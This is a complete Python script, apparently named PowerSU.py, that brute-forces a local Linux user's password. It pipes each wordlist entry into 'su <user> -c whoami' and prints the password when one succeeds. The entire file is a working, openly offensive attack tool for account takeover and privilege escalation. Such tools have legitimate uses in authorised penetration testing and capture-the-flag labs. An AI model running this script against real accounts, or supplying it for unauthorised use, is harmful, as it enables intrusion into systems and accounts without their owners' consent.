#!/usr/bin/env python3

import os
import sys
import argparse
import subprocess
import signal
import colorama
from colorama import Back, Fore, Style



class sets:
    set1 = '['
    set2 = ']'
    set3 = '☻'
    set4 = '✔'
    set5 = '>'
    set6 = '<'
    set7 = '-'
    set8 = '☠'
    set9 = 'python3 PowerSU.py'
    set10 = 'WORDLIST'
    set11 = 'USER'
    set12 = 'Usage:'
    set13 = 'Username:'
    set14 = 'Wordlist:'
    set15 = 'Password:'
    set16 = 'Line:'
    set17 = 'Status:'

class box:
    BOX1 = f"{Fore.WHITE}{sets.set1}{Fore.RED}{sets.set8}{Fore.WHITE}{sets.set2}{Fore.RESET}"
    BOX2 = f"{Fore.WHITE}{sets.set1}{Fore.RED}{sets.set7}{Fore.WHITE}{sets.set2}{Fore.RESET}"
    BOX3 = f"{Fore.WHITE}{sets.set1}{Fore.GREEN}{sets.set3}{Fore.WHITE}{sets.set2}{Fore.RESET}"
    BOX4 = f"{Fore.WHITE}{sets.set1}{Fore.GREEN}{sets.set4}{Fore.WHITE}{sets.set2}{Fore.RESET}"


def help():
    print()
    print(f"{box.BOX3} {Fore.RED}{sets.set12} {Fore.WHITE}{sets.set9} -u {Fore.RED}{sets.set6}{Fore.WHITE}{sets.set11}{Fore.RED}{sets.set5}{Fore.WHITE} -w {Fore.RED}{sets.set6}{Fore.WHITE}{sets.set10}{Fore.RED}{sets.set5}{Fore.RESET}")
    print()

def info(username, wordlist):
    print(f"{box.BOX4} {Fore.WHITE}{sets.set13} {Fore.MAGENTA}{username}{Fore.RESET}")
    os.system("sleep 1")
    print(f"{box.BOX4} {Fore.WHITE}{sets.set14} {Fore.MAGENTA}{wordlist}{Fore.RESET}")
    os.system("sleep 1")
    print(f"{box.BOX3} {Fore.WHITE}{sets.set17}{Fore.RESET}")
    os.system("sleep 1")

def ctrl_c(signal, frame):
    print()
    sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-u', '--username', type=str, help='Username')
    parser.add_argument('-w', '--wordlist', type=str, help='Wordlist')
    args = parser.parse_args()

    signal.signal(signal.SIGINT, ctrl_c)

    if args.username:
        info(args.username, args.wordlist)
    else:
        help()
        sys.exit(0)

    with open(args.wordlist, 'rb') as f:
       lines = f.readlines()
       siz = len(lines)

    for line_number, password in enumerate(lines, start=1):
        password = password.decode('latin-1').strip()  # Decode using a suitable encoding
        progress = line_number * 100 // siz
        print(f"\033[?25l\r\033[K{Fore.LIGHTWHITE_EX}    {line_number}/{siz}/{progress}%/{password}{Fore.RESET}", end="")
        sys.stdout.flush()

        try:
           subprocess.run(["su", args.username, "-c", "whoami"], input=password.encode(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=0.1, check=True)
        except subprocess.TimeoutExpired:
            
            continue  # Skip to the next password attempt
        except subprocess.CalledProcessError:
            pass
        else:
            # Password successfully decrypted
            print(f"\n{box.BOX1} {Fore.RED}{sets.set15} {Fore.GREEN}{password} {Fore.RED}{sets.set16} {Fore.GREEN}{line_number}{Fore.RESET}")
            print(f"{Fore.WHITE}{Fore.RESET}")
            sys.exit(0)

if __name__ == "__main__":
    main()
